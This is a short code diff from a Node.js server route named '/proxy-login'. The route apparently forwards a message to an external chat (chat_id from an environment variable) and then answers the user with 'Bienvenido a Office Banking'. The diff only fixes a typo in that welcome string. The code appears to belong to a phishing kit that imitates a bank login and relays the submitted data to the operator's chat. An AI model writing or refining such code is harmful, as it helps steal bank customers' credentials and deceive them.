@@ -78,7 +78,7 @@ app.post("/proxy-login", async (req, res) => {
       body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: mensaje })
     });
 
-    res.json({ status: "IBienvenido a Office Banking" });
+    res.json({ status: "Bienvenido a Office Banking" });
   } catch (err) {
     res.status(500).json({ status: "error", error: err.message });
   }
